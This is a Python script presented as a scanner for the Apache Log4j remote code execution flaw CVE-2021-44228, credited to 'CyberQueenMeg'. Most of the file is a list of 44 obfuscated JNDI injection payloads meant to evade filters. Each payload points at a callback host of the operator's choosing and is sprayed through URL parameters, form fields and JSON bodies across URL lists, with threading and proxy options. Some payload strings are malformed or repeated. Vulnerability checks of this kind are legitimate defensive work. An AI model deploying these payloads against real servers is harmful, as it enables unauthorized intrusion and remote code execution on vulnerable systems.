#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-bypass: A generic scanner for Apache log4j RCE CVE-2021-44228
# Created by Megan Howell (CyberQueenMeg)
# ******************************************************************

import argparse
import random
import requests
import time
import sys
from urllib import parse as urlparse
import base64
import json
import random
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint
from concurrent.futures import ThreadPoolExecutor


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Exception Scanner', "magenta")
cprint('[•] Scanner provided by CyberQueenMeg', "cyan")
cprint('[•] If you are running this using the BlackArch library and scanning a list of URLs, put them in /usr/share/log4j-bypass to get the script to scan them', "cyan")


if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("-w", "--wait-time", 
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 60].",
                    default=60,
                    type=int,
                    action='store')
parser.add_argument("-c", "--callback-url",
                    dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.",
                    action='store')
parser.add_argument("-t", "--threads",
                    dest="threads",
                    help="Num threads for concurrent scanning - [Default: 2].",
                    default=2,
                    type=int,
                    action='store')
parser.add_argument('--header', dest="header", action="store", help="Custom header", required=True)

args = parser.parse_args()

header = args.header

headers = {
    'User-Agent': header,
}
        

post_data_parameters = ["username", "user", "email", "email_address", "password", "search"]
timeout = 4

proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data

def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("https://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})



def scan_url(url, callback_host):
    cprint(f"[•] URL: {url}", "magenta")
    parsed_url = parse_url(url)
    payload0 = "${jndi:ldap://"+callback_host+"]"
    payload1 = "{${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://"+callback_host+"}"
    payload2 = "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://"+callback_host+"}"
    payload3 = "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://"+callback_host+"}"
    payload4 = "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://"+callback_host+"}"
    payload5 = "${${::-j}ndi:rmi://"+callback_host+"}"
    payload6 = "${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}"+callback_host+"}"
    payload7 = "${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://"+callback_host+"}"
    payload8 = "${\u006a\u006e\u0064\u0069:ldap://"+callback_host+"}"
    payload9 = "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//"+callback_host+"}"
    payload10 = "${jndi:ldap://127.0.0.1#"+callback_host+"}" #2.15 bypass
    payload11 = "${jnd${sys:SYS_NAME:-i}:ldap:/"+callback_host+"}"
    payload12 = "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://"+callback_host+"}"
    payload13 = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://"+callback_host+"}"
    payload14 = "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}"+callback_host+"}"
    payload15 = "${jndi:dns:/"+callback_host+"}" #thanks to @christian-tallon
    payload16 = "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://"+callback_host+"}" #thanks to @christian-tallon
    payload17 = "${jndi:rmi://"+callback_host+"}" #thanks to @christian-tallon
    payload18 = "${${lower:jndi}:${lower:rmi}://"+callback_host+"}" #thanks to @christian-tallon
    payload19 = "${${lower:${lower:jndi}}:${lower:rmi}://"+callback_host+"}" #thanks to @christian-tallon
    payload20 = "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://"+callback_host+"}" #thanks to @christian-tallon
    payload21 = "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://"+callback_host+"}" #thanks to @christian-tallon
    payload22 = "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://"+callback_host+"}" #thanks to @christian-tallon
    payload23 = "${jndi:${lower:l}${lower:d}a${lower:p}://"+callback_host+"}" #thanks to @christian-tallon
    payload24 = "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//"+callback_host+"}" #thanks to @christian-tallon
    payload25 = "${jn${env::-}di:ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload26 = "${jn${date:}di${date:':'}ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload27 = "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload28 = "${j${main:\k5:-Nd}i${spring:k5:-:}ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload29 = "${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload30 = "${j${::-nD}i${::-:}ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload31 = "${j${EnV:K5:-nD}i:ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload32 = "${j${loWer:Nd}i${uPper::}ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload33 = "${jndi:ldap://127.0.0.1#"+callback_host+"}" #thanks to @christian-tallon
    payload34 = "${jnd${upper:ı}:ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload35 = "${jnd${sys:SYS_NAME:-i}:ldap:/"+callback_host+"}" #thanks to @christian-tallon
    payload36 = "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload37 = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://"+callback_host+"}" #thanks to @christian-tallon
    payload38 = "${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload39 = "${\u006a\u006e\u0064\u0069:ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload40 = "${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}."+callback_host+"}" #thanks to @christian-tallon
    payload41 = "${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://"+callback_host+"}" #thanks to @christian-tallon
    payload42 = "%24%7Bjndi:ldap://"+callback_host+"%7D" #thanks to @christian-tallon
    payload43 = "%24%7Bjn$%7Benv::-%7Ddi:ldap://"+callback_host+"%7D" #thanks to @christian-tallon
    payloads = [payload0, payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, payload9, payload10, payload11, payload12, payload13, payload14, payload15, payload16, payload17, payload18, payload19, payload20, payload21, payload22, payload23, payload24, payload25, payload26, payload27, payload28, payload29, payload30, payload31, payload32, payload33, payload34, payload35, payload36, payload37, payload38, payload39, payload40, payload41, payload42, payload43]
    for payload in payloads:
        cprint(f"[•] PAYLOAD: {payload}", "cyan")
        try:
            requests.request(url=url,
                                method="GET",
                                params={"v": payload},
                                verify=False,
                                timeout=timeout,
                                allow_redirects=True,
                                proxies=proxies)

        except Exception as e:
            cprint(f"EXCEPTION: {e}")

        try:
            # Post body
            requests.request(url=url,
                                method="POST",
                                params={"v": payload},
                                data=get_fuzzing_post_data(payload),
                                verify=False,
                                timeout=timeout,
                                allow_redirects=True,
                                proxies=proxies)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")

        try:
            # JSON body
            requests.request(url=url,
                                method="POST",
                                params={"v": payload},
                                json=get_fuzzing_post_data(payload),
                                verify=False,
                                timeout=timeout,
                                allow_redirects=True,
                                proxies=proxies)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")


def main():
    urls = []

    cprint(f"[•] Using [{args.custom_dns_callback_host}] for DNS callback.", "cyan")
    callback_host =  args.custom_dns_callback_host

    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)


    cprint("[%] Checking for Log4j RCE CVE-2021-44228 and bypasses.", "magenta")
    with ThreadPoolExecutor(args.threads) as exe:
        for url in urls:
            exe.submit(scan_url, url, callback_host)

    if args.custom_dns_callback_host:
        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "magenta")
        return


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
